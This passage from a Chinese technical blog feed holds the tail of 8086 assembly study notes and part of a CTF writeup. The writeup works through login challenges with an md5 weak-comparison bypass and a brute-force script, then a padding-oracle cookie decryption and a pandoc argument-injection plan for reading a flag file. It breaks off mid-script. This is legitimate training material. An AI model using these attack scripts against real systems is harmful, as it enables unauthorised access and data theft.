AL,10H--&gt;立即数(只能是源操作数，即寄存器或者存储器)寄存器寻址方式(存于寄存器中)inc cx;加1dec cs;减1mov ax,bx存储器寻址方式(存放于存储器之中)||    mov ax,[25000H]--&gt;存储器操作数||-&gt;  直接寻址方式||-&gt;  寄存器间接寻址方式||-&gt;  寄存器相对寻址方式||-&gt;  基址加变址寻址方式||-&gt;  相对加基址变址寻址方式</code></pre><p><a href="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/11/5be7ef97a7d74.png" alt="屏幕快照 2018-11-11 下午4.59.54.png"></a></p><h3 id="1-and和or指令"><a href="#1-and和or指令" class="headerlink" title="1.and和or指令"></a>1.and和or指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;可以将操作对象的相应位设为0，其它位保持不变</span><br><span class="line">and a1,11111110B</span><br><span class="line"></span><br><span class="line">;可以将操作对象的相应位设为1，其它位保持不变</span><br><span class="line">or a1,00000001B</span><br></pre></td></tr></table></figure><h3 id="2-ASCII"><a href="#2-ASCII" class="headerlink" title="2.ASCII"></a>2.ASCII</h3><p>a字符–&gt;61H存储在指定空间中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;使用&apos;......&apos;指明数据是以字符的形式给出的</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &apos;unIX&apos;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">;注意:小写字母的ASCII码值比大写字母的ASCII码值大20H</span><br></pre></td></tr></table></figure></p><h3 id="3-指令处理数据的长度"><a href="#3-指令处理数据的长度" class="headerlink" title="3.指令处理数据的长度"></a>3.指令处理数据的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;一个字单元</span><br><span class="line">mov word ptr ds:[0],1</span><br><span class="line">;一个字节单元</span><br><span class="line">mov byte ptr ds:[0],1</span><br></pre></td></tr></table></figure><h3 id="4-伪指令dd"><a href="#4-伪指令dd" class="headerlink" title="4.伪指令dd"></a>4.伪指令dd</h3><p>dd-&gt;字节型数据<br>dw-&gt;字型数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data segment</span><br><span class="line">;数据为01H，在data:0处，占1个字节</span><br><span class="line">    db 1</span><br><span class="line">;数据为0001H，在data:1处，占1个字</span><br><span class="line">    dw 1</span><br><span class="line">;数据为00000001H，在data:2处，占2个字节</span><br><span class="line">    dd 1</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure><h3 id="5-dup"><a href="#5-dup" class="headerlink" title="5.dup"></a>5.dup</h3><p>dup配合db,dw,dd进行数据重复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;db 重复的次数 dup (重复的字节型数据)</span><br><span class="line">db 3 dup (0,1,2)</span><br><span class="line">;定义了9个字节</span><br><span class="line">;相当于db 0,1,2,0,1,2,0,1,2</span><br></pre></td></tr></table></figure><h2 id="四、转移指令的原理"><a href="#四、转移指令的原理" class="headerlink" title="四、转移指令的原理"></a>四、转移指令的原理</h2><p>可以修改IP，或同时修改CS和IP的指令统称为转移指令。</p><h3 id="1-操作符-offset"><a href="#1-操作符-offset" class="headerlink" title="1.操作符 offset"></a>1.操作符 offset</h3><p><code>offset</code> 可以取得标号的偏移地址</p><h3 id="2-jmp指令"><a href="#2-jmp指令" class="headerlink" title="2.jmp指令"></a>2.jmp指令</h3><p><code>jmp</code>为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;转到标号处执行命令,这个是</span><br><span class="line">jmp short 标号</span><br><span class="line">;段间转移</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h3 id="3-jcxz指令"><a href="#3-jcxz指令" class="headerlink" title="3.jcxz指令"></a>3.jcxz指令</h3><p><code>jcxz</code>条件转移指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号</span><br></pre></td></tr></table></figure><h3 id="4-loop指令"><a href="#4-loop指令" class="headerlink" title="4.loop指令"></a>4.loop指令</h3><p>loop指令为循环指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop 标号</span><br></pre></td></tr></table></figure><h3 id="5-in指令"><a href="#5-in指令" class="headerlink" title="5.in指令"></a>5.in指令</h3><p>用于CPU从外设端口接收数据</p><h3 id="6-out输出指令"><a href="#6-out输出指令" class="headerlink" title="6.out输出指令"></a>6.out输出指令</h3><p>用于CPU向外设端口发送数据</p><h3 id="7-xchg交换指令"><a href="#7-xchg交换指令" class="headerlink" title="7.xchg交换指令"></a>7.xchg交换指令</h3><h3 id="8-地址传送指令-LEA-amp-LDS-amp-LES"><a href="#8-地址传送指令-LEA-amp-LDS-amp-LES" class="headerlink" title="8.地址传送指令:LEA &amp; LDS &amp; LES"></a>8.地址传送指令:LEA &amp; LDS &amp; LES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;reg16--16位通用寄存器</span><br><span class="line">;mem--存储单元</span><br><span class="line">LEA reg16,mem</span><br></pre></td></tr></table></figure><h3 id="9-标志传送指令-LAHF-amp-SAHF-amp-PUSHF-amp-POPF"><a href="#9-标志传送指令-LAHF-amp-SAHF-amp-PUSHF-amp-POPF" class="headerlink" title="9.标志传送指令:LAHF &amp; SAHF &amp; PUSHF &amp; POPF"></a>9.标志传送指令:LAHF &amp; SAHF &amp; PUSHF &amp; POPF</h3><h2 id="五、算数运算指令的原理"><a href="#五、算数运算指令的原理" class="headerlink" title="五、算数运算指令的原理"></a>五、算数运算指令的原理</h2><h3 id="1-加法指令"><a href="#1-加法指令" class="headerlink" title="1.加法指令"></a>1.加法指令</h3><p>• ADD(Addition) 加法指令</p><p>• ADC(Add withCarry)带进位加法指令</p><p>• INC(Increment)加 1指令</p><p>• AAA(ASCIIadjustforaddition)加法ASCII调整指令</p><p>• DAA(Decimaladjustforaddition)加法十进制调整指令</p><h3 id="2-减法指令"><a href="#2-减法指令" class="headerlink" title="2.减法指令"></a>2.减法指令</h3><p>8086有7条减法指令:</p><p>• SUB(Subtraction)减法指令</p><p>• SBB(SubtractionwithBorrow)进位减法指令</p><p>• DEC(Decrement by 1)减1指令</p><p>• NEG(Negate) 求补指令</p><p>• CMP(Compare)比较指令</p><p>• AAS(ASCII Adjust for Subtraction) 减法ASCII调整指令</p><p>• DAS(Decimal Adjust for Subtraction) 减法十进制调整指令</p><h3 id="3-乘法指令"><a href="#3-乘法指令" class="headerlink" title="3. 乘法指令"></a>3. 乘法指令</h3><p>1）无符号乘法（MUL）</p><p>2）带符号乘法（IMUL）</p><h3 id="4-除法指令"><a href="#4-除法指令" class="headerlink" title="4.除法指令"></a>4.除法指令</h3><p>1）无符号除法（DIV）</p><p>2）带符号除法（IDIV）</p><p>3）字节扩展指令（CBW）</p><p>4）字扩展指令（CWD） </p><h3 id="5-十进制调整指令"><a href="#5-十进制调整指令" class="headerlink" title="5.十进制调整指令"></a>5.十进制调整指令</h3><p>共六条</p><p>• AAA非压缩BCD码的加法十进制调整</p><p>• DAA压缩BCD码的加法十进制调整</p><p>• AAS非压缩BCD码的减法十进制调整</p><p>• DAS压缩BCD码的减法十进制调整</p><p>• AAM乘法的十进制调整</p><p>• AAD除法的十进制调整</p><h2 id="六、逻辑运算和移位指令"><a href="#六、逻辑运算和移位指令" class="headerlink" title="六、逻辑运算和移位指令"></a>六、逻辑运算和移位指令</h2><p>针对二进制0/1进行的操作</p><h3 id="1-逻辑运算指令"><a href="#1-逻辑运算指令" class="headerlink" title="1.逻辑运算指令"></a>1.逻辑运算指令</h3><p>• AND逻辑“与”指令(有0则0)</p><p>• TEST测试指令(只改变标志位)</p><p>• OR逻辑“或”指令(有1则1)</p><p>• XOR（exclusive OR)逻辑“异或”指令(相同为0，不同为1)</p><p>• NOT逻辑“非”指令(不能是立即数)</p><h3 id="2-移位指令"><a href="#2-移位指令" class="headerlink" title="2.移位指令"></a>2.移位指令</h3><p>• SAL (Shift Arithmetic Left)算术左移(无符号数乘2，最高位进CL)</p><p>• SAR (Shiftarithmeticright)算术右移(无符号数除2，最低位进CF)</p><p>• SHL (Shift logical left)逻辑左移(最低位不变，)</p><p>• SHR (Shiftlogicalright)逻辑右移(最高位不变，低位移入CF)</p><p>• ROL (Rotateleft)循环左移</p><p>• ROR (Rotateright)循环右移</p><p>• RCL (Rotateleftwith carry)带进位循环左移(就是循环时是带CF的)</p><p>• RCR (Rotateright withcarry)带进位循环右移</p><h2 id="七、串操作类指令"><a href="#七、串操作类指令" class="headerlink" title="七、串操作类指令"></a>七、串操作类指令</h2><p>• “串”就是内存中一段地址相连的<strong>字节B或字W</strong>；</p><p>• 串操作，也叫数据块操作；</p><p>• 可实现存储器数据间的直接传送；</p><p>• 8086有5种基本串操作：</p><p>MOVS（Move string）串传送指令</p><p>CMPS（Compare string）串比较指令</p><p>SCAS（Scan string）串扫描指令</p><p>LODS（Load from string）取串指令</p><p>STOS （Store in to string）存串指令</p><h3 id="1-标志处理指令"><a href="#1-标志处理指令" class="headerlink" title="1.标志处理指令"></a>1.标志处理指令</h3><p>• CLC （Clearcarryflag)清C标志</p><p>• STC（Setcarryflag )置C标志</p><p>• CMC（Complementcarryflag）对C求反</p><p>• CLD（Cleardirectionflag)清D标志</p><p>• STD（Setdirectionflag)置D标志</p><p>• CLI（Clearinterruptflag)清I标志</p><p>• STI （Setinterruptenableflag)置I标志</p><h3 id="2-其他处理机控制指令"><a href="#2-其他处理机控制指令" class="headerlink" title="2.其他处理机控制指令"></a>2.其他处理机控制指令</h3><p>• NOP（Nooperation)空操作</p><p>• HLT（Halt) CPU暂停状态</p><p>• WAITCPU等待状态</p><p>• ESC交权</p><p>• LOCK（Lockbus)总线锁定</p><h2 id="八、opcode"><a href="#八、opcode" class="headerlink" title="八、opcode"></a>八、opcode</h2><p>操作码(Operation Code, OPCode) 描述机器语言指令中，指定要执行某种操作的机器码。</p><p>OPCode在不同的场合中通常具有不同的含义，例如PHP虚拟机(Zend VM)、java虚拟机(JVM)</p><p>以及一些软件保护虚拟机中的最小操作单元都可以称之为OPCode。</p><h2 id="九、参考"><a href="#九、参考" class="headerlink" title="九、参考"></a>九、参考</h2><p><a href="https://www.kanxue.com/book-31.htm" target="_blank" rel="noopener">https://www.kanxue.com/book-31.htm</a></p><p>《汇编语言(第3版)》王爽著</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、基础概念&quot;&gt;&lt;a href=&quot;#一、基础概念&quot; class=&quot;headerlink&quot; title=&quot;一、基础概念&quot;&gt;&lt;/a&gt;一、基础概念&lt;/h2&gt;&lt;h3 id=&quot;0-汇编基础&quot;&gt;&lt;a href=&quot;#0-汇编基础&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>P.W.N. CTF Writeup</title>
    <link href="http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/"/>
    <id>http://zer0yu.github.io/2018/11/02/P-W-N-CTF-note/</id>
    <published>2018-11-02T10:33:15.000Z</published>
    <updated>2018-11-13T15:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Login-Sec"><a href="#Login-Sec" class="headerlink" title="Login Sec"></a>Login Sec</h1><p><strong>Login 1</strong>的代码如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">         &#123;</span><br><span class="line">             x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">         &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="keyword">var</span> url_content = url.parse(req.url, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (passwd == url_content.query.passwd) &#123;</span><br><span class="line">       res.write(fs.readFileSync(<span class="string">'flag.txt'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.write(<span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>我在此将其简化一下，方便本地运行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _0x86d1=[<span class="string">"\x68\x65\x78"</span>,<span class="string">"\x72\x61\x6E\x64\x6F\x6D\x42\x79\x74\x65\x73"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">                 &#123;</span><br><span class="line">                         x: crypto[_0x86d1[<span class="number">1</span>]](<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">                 &#125;[x].toString(_0x86d1[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePart2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    passwd = generatePart1() + generatePart2();</span><br><span class="line">    <span class="built_in">console</span>.log(passwd)</span><br></pre></td></tr></table></figure><p>运行结果为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~/Desktop  node login.js</span><br><span class="line">undefined1337</span><br></pre></td></tr></table></figure><p>提交<code>undefined1337</code>得到flag的第一部分<code>flag{W0w_1_gu3ss_th1s</code></p><p><strong>Login 2</strong>的代码如下，可以看出是md5的弱类型比较，只要求md5之后的值开头是0e即可，提交<code>s878926199a</code>得到下一部分的flag<code>_t0_be_4_pr3tty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash(<span class="string">"md5"</span>, $_GET[<span class="string">'passwd'</span>]) == <span class="string">'0e514198428367523082236389979035'</span>)        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Login 3</strong>部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">passwd = open(<span class="string">"/opt/passwd.txt"</span>).read()</span><br><span class="line">flag = open(<span class="string">"/opt/flag.txt"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    userpw = request.args.get(<span class="string">"passwd"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> userpw == passwd:</span><br><span class="line">        <span class="keyword">return</span> flag, <span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">assert</span>(len(passwd) == <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(passwd.isdigit())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>关键在于一下两行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(len(passwd) == 3)</span><br><span class="line">assert(passwd.isdigit())</span><br></pre></td></tr></table></figure><p>这两行判断了从<code>/opt/passwd.txt</code>中读出的内容的长度是否是3，类型是否是数字。一般我们可能会字节考虑<code>100-999</code>,但是要知道<code>000、009</code>这些长度也是3，也是数字类型。所以写爆破脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://login3.uni.hctf.fun/?passwd=%03d"</span> % i</span><br><span class="line">        r = requests.get(url).content</span><br><span class="line">        s = <span class="string">"""&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"""</span></span><br><span class="line">        <span class="keyword">if</span>(s != r.decode(<span class="string">'utf-8'</span>)):</span><br><span class="line">                print(i)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终爆破得到结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros  ~/Desktop  python testlogin.py</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p>提交<code>007</code>得到最后一部分flag <code>4_d4mn_l0ng_fl4g}</code></p><h1 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h1><p>target:<code>http://converter.uni.hctf.fun/</code></p><p>分析之后，可以看到vals的长度是16的倍数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">content=test</span><br><span class="line"></span><br><span class="line">vals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9</span><br><span class="line"></span><br><span class="line">128个字符</span><br><span class="line"></span><br><span class="line">content=testtest</span><br><span class="line"></span><br><span class="line">vals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961</span><br><span class="line"></span><br><span class="line">160个字符</span><br><span class="line"></span><br><span class="line">content=testtestte</span><br><span class="line"></span><br><span class="line">vals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265</span><br><span class="line"></span><br><span class="line">160个字符</span><br></pre></td></tr></table></figure></p><p>比如以下这组数据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content=t</span><br><span class="line"></span><br><span class="line">vals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551</span><br></pre></td></tr></table></figure><p>我们修改vals的第一位后发送请求，得到一个错误<code>JSONDecodeError: Expecting value: line 1 column 1 (char 0)</code>，修改最后一位发送请求，得到一个<code>ValueError: Invalid padding bytes.</code>。由以上两点可以看出，cookie中包含<code>AES-CBC-encrypted JSON</code>数据。所以在这种分组加密中我们可以联想到Padding Oracle攻击，关于这种攻击可以参考:</p><p><a href="https://www.jianshu.com/p/ad8bdd87e131" target="_blank" rel="noopener">《Web狗要懂的Padding Oracle攻击》</a></p><p><a href="https://err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">《Padding_Oracle 攻击》</a></p><p>接下来我们使用脚本将cookie值进行解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># you need get padding_oracle from there</span></span><br><span class="line"><span class="comment"># https://github.com/pspaul/padding-oracle</span></span><br><span class="line"><span class="comment"># you need python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())</span><br><span class="line">print(<span class="string">'Plaintext: &#123;&#125;'</span>.format(plain))</span><br></pre></td></tr></table></figure><p>解密后cookie的内容为<code>{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}</code>，一般这种文档转换使用的是<code>pandoc</code>，此处的<code>f</code>是控制输入格式，<code>c</code>是我们输入的内容，<code>t</code>是控制输出格式。</p><p>由题目可知我们要读取flag.txt中的内容，所以我们使用pandoc的<code>-A</code>参数，把flag.txt的内容包含出来。</p><blockquote><p>-A FILE, –include-after-body=FILE<br>Include contents of FILE, verbatim, at the end of the document body (before the  tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies –standalone.</p></blockquote><p>要注意此处前端好像有白名单过滤，直接代入我们的参数话得不到我们想要的结果。</p><p><a href="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" alt="屏幕快照 2018-11-01 下午6.06.45.png"></a></p><p>所以我在抓包之后修改cookie的值。cookie的生成脚本如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 